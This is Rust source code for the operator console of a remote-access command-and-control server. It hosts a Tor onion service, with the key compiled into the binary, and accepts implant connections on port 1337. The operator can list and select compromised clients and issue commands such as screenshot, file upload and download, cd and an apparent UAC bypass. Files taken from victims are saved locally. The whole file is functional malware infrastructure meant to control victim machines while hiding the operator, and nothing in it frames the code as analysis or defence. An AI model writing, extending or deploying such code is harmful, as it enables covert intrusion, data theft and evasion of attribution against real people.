use std::collections::HashMap;
use std::io::Write;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

use anyhow::{Result, anyhow};

use arti_client::{TorClient, TorClientConfig};

use futures::StreamExt;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::Mutex;

use rustyline::{
    Editor,
    history::DefaultHistory,
    Context,
    Helper,
};
use rustyline::completion::{Completer, Pair};
use rustyline::highlight::Highlighter;
use rustyline::hint::Hinter;
use rustyline::validate::{Validator, ValidationResult};

use tor_cell::relaycell::msg::{Connected, End};
use tor_hscrypto::pk::HsIdKeypair;
use tor_llcrypto::pk::ed25519::{ExpandedKeypair, Keypair};
use tor_proto::client::stream::IncomingStreamRequest;

use base64::{engine::general_purpose, Engine as _};

// ============================================================
// Menu helper (tab completion for the c2> menu)
// ============================================================

const MENU_COMMANDS: &[&str] = &["list", "select", "exit"];

#[derive(Clone)]
struct MenuHelper;

impl Completer for MenuHelper {
    type Candidate = Pair;

    fn complete(&self, line: &str, pos: usize, _ctx: &Context<'_>) -> rustyline::Result<(usize, Vec<Pair>)> {
        let line_before = &line[..pos];
        let words: Vec<&str> = line_before.split_whitespace().collect();

        if words.len() > 1 {
            return Ok((pos, Vec::new()));
        }

        let prefix = words.last().unwrap_or(&"");
        let mut candidates = Vec::new();
        for cmd in MENU_COMMANDS {
            if cmd.starts_with(prefix) {
                candidates.push(Pair {
                    display: cmd.to_string(),
                    replacement: cmd.to_string(),
                });
            }
        }

        let start = line_before.rfind(|c: char| c.is_whitespace())
            .map(|i| i + 1)
            .unwrap_or(0);

        Ok((start, candidates))
    }
}

impl Hinter for MenuHelper {
    type Hint = String;

    fn hint(&self, _line: &str, _pos: usize, _ctx: &Context<'_>) -> Option<String> {
        None
    }
}

impl Highlighter for MenuHelper {}

impl Validator for MenuHelper {
    fn validate(&self, _ctx: &mut rustyline::validate::ValidationContext) -> rustyline::Result<ValidationResult> {
        Ok(ValidationResult::Valid(None))
    }
}

impl Helper for MenuHelper {}

// ============================================================
// Session helper (tab completion for client interactive session)
// ============================================================

const SESSION_COMMANDS: &[&str] = &[
    "help", "/h", "/?",
    "screenshot",
    "upload",
    "download",
    "cd",
    "uac",
    "exit", "quit", "/quit",
];

#[derive(Clone)]
struct SessionHelper;

impl Completer for SessionHelper {
    type Candidate = Pair;

    fn complete(&self, line: &str, pos: usize, _ctx: &Context<'_>) -> rustyline::Result<(usize, Vec<Pair>)> {
        let line_before = &line[..pos];
        let words: Vec<&str> = line_before.split_whitespace().collect();

        if words.len() > 1 {
            return Ok((pos, Vec::new()));
        }

        let prefix = words.last().unwrap_or(&"");
        let mut candidates = Vec::new();
        for cmd in SESSION_COMMANDS {
            if cmd.starts_with(prefix) {
                candidates.push(Pair {
                    display: cmd.to_string(),
                    replacement: cmd.to_string(),
                });
            }
        }

        let start = line_before.rfind(|c: char| c.is_whitespace())
            .map(|i| i + 1)
            .unwrap_or(0);

        Ok((start, candidates))
    }
}

impl Hinter for SessionHelper {
    type Hint = String;

    fn hint(&self, _line: &str, _pos: usize, _ctx: &Context<'_>) -> Option<String> {
        None
    }
}

impl Highlighter for SessionHelper {}

impl Validator for SessionHelper {
    fn validate(&self, _ctx: &mut rustyline::validate::ValidationContext) -> rustyline::Result<ValidationResult> {
        Ok(ValidationResult::Valid(None))
    }
}

impl Helper for SessionHelper {}

// ============================================================
// Client session handler
// ============================================================

type ClientMap = Arc<Mutex<HashMap<u64, tor_proto::client::stream::DataStream>>>;

async fn handle_client(
    mut stream: tor_proto::client::stream::DataStream,
) -> Result<()> {
    let (mut reader, mut writer) = tokio::io::split(&mut stream);

    let mut rl = Editor::<SessionHelper, DefaultHistory>::new()?;
    rl.set_helper(Some(SessionHelper));
    let _ = rl.load_history("session_history.txt");

    let mut buf = vec![0u8; 16384];

    let mut response = Vec::new();
    loop {
        let n = reader.read(&mut buf).await?;
        if n == 0 {
            return Err(anyhow!("Connection closed"));
        }
        response.extend_from_slice(&buf[..n]);
        if response.ends_with(b">> ") {
            break;
        }
    }
    print!("{}", String::from_utf8_lossy(&response));
    std::io::stdout().flush()?;

    loop {
        let readline = rl.readline("");
        match readline {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }

                let _ = rl.add_history_entry(line.as_str());
                let _ = rl.save_history("session_history.txt");

                if let Some(filename) = line.strip_prefix("download ") {
                    let filename = filename.trim();
                    match std::fs::read(filename) {
                        Ok(data) => {
                            let encoded = general_purpose::STANDARD.encode(&data);
                            let cmd = format!("download {} {}", filename, encoded);
                            writer.write_all(cmd.as_bytes()).await?;
                            writer.write_all(b"\n").await?;
                            writer.flush().await?;
                        }
                        Err(e) => {
                            println!("Error reading '{}': {}", filename, e);
                            continue;
                        }
                    }
                } else {
                    writer.write_all(line.as_bytes()).await?;
                    writer.write_all(b"\n").await?;
                    writer.flush().await?;
                }

                let mut response = Vec::new();
                loop {
                    let n = reader.read(&mut buf).await?;
                    if n == 0 {
                        return Err(anyhow!("Connection closed by client"));
                    }
                    response.extend_from_slice(&buf[..n]);
                    if response.ends_with(b">> ") {
                        break;
                    }
                }

                let response_str = String::from_utf8_lossy(&response);

                if let Some(rest) = response_str.strip_prefix("[file] ") {
                    let rest = rest.trim_end_matches(">> ").trim();
                    if let Some(space) = rest.find(' ') {
                        let filename = &rest[..space];
                        let encoded = &rest[space + 1..];
                        if let Ok(data) = general_purpose::STANDARD.decode(encoded) {
                            if let Err(e) = std::fs::write(filename, &data) {
                                eprintln!("Failed to save {}: {}", filename, e);
                            } else {
                                println!("[Saved file: {} ({} bytes)]", filename, data.len());
                            }
                        }
                    }
                }

                print!("{}", response_str);
                std::io::stdout().flush()?;
            }
            Err(_) => break,
        }
    }

    Ok(())
}

// ============================================================
// Main
// ============================================================

#[tokio::main]
async fn main() -> Result<()> {

    let tor = TorClient::create_bootstrapped(
        TorClientConfig::default()
    ).await?;

    println!("Tor bootstrapped");

    let hs_config = tor_hsservice::OnionServiceConfig::builder()
        .nickname(tor_hsservice::HsNickname::new("operator".to_string())?)
        .build()?;

    let hsid_keypair = {
        let seed = include_bytes!("../config/onion_seed");
        let keypair = Keypair::from_bytes(seed);
        let expanded = ExpandedKeypair::from(&keypair);
        HsIdKeypair::from(expanded)
    };

    let (_, mut requests) =
        tor.launch_onion_service_with_hsid(hs_config, hsid_keypair)?
            .ok_or_else(|| anyhow!("failed to launch onion service"))?;

    let hostname = String::from_utf8_lossy(
        include_bytes!("../config/hostname")
    ).trim().to_string();

    println!("Onion address: {}", hostname);

    let clients: ClientMap = Arc::new(Mutex::new(HashMap::new()));
    let next_id = Arc::new(AtomicU64::new(1));

    let (menu_tx, mut menu_rx) = tokio::sync::mpsc::unbounded_channel::<String>();

    tokio::task::spawn_blocking(move || {
        let mut rl = Editor::<MenuHelper, DefaultHistory>::new().unwrap();
        rl.set_helper(Some(MenuHelper));
        loop {
            match rl.readline("c2> ") {
                Ok(line) => {
                    if menu_tx.send(line).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    loop {
        tokio::select! {
            Some(request) = requests.next() => {
                let clients = clients.clone();
                let next_id = next_id.clone();
                tokio::spawn(async move {
                    match request.accept().await {
                        Ok(mut stream_requests) => {
                            while let Some(stream_request) = stream_requests.next().await {
                                let port = match stream_request.request() {
                                    IncomingStreamRequest::Begin(begin) => begin.port(),
                                    _ => {
                                        let _ = stream_request.reject(End::new_misc()).await;
                                        continue;
                                    }
                                };

                                if port == 1337 {
                                    match stream_request.accept(Connected::new_empty()).await {
                                        Ok(data_stream) => {
                                            let id = next_id.fetch_add(1, Ordering::SeqCst);
                                            clients.lock().await.insert(id, data_stream);
                                            println!("\n[Client {} connected on port 1337]", id);
                                        }
                                        Err(e) => println!("stream accept error: {}", e),
                                    }
                                } else {
                                    println!("Rejected connection to port {} (only 1337 allowed)", port);
                                    let _ = stream_request.reject(End::new_misc()).await;
                                }
                            }
                        }
                        Err(e) => println!("accept error: {}", e),
                    }
                });
            }
            Some(line) = menu_rx.recv() => {
                let parts: Vec<&str> = line.trim().split_whitespace().collect();
                if parts.is_empty() {
                    continue;
                }
                match parts[0] {
                    "list" => {
                        let locked = clients.lock().await;
                        if locked.is_empty() {
                            println!("No clients connected");
                        } else {
                            for id in locked.keys() {
                                println!("Client {}", id);
                            }
                        }
                    }
                    "select" => {
                        if let Some(id_str) = parts.get(1) {
                            if let Ok(id) = id_str.parse::<u64>() {
                                let stream = clients.lock().await.remove(&id);
                                if let Some(stream) = stream {
                                    println!("[Selected client {}, entering interactive session]", id);
                                    println!("[Type exit/quit to return to menu]");
                                    let _ = tokio::task::spawn_blocking(move || {
                                        let handle = tokio::runtime::Handle::current();
                                        handle.block_on(handle_client(stream))
                                    }).await;
                                    println!("[Session with client {} ended]", id);
                                } else {
                                    println!("Client {} not found", id);
                                }
                            }
                        }
                    }
                    "exit" => break,
                    _ => println!("Commands: list, select <id>, exit"),
                }
            }
        }
    }

    Ok(())
}
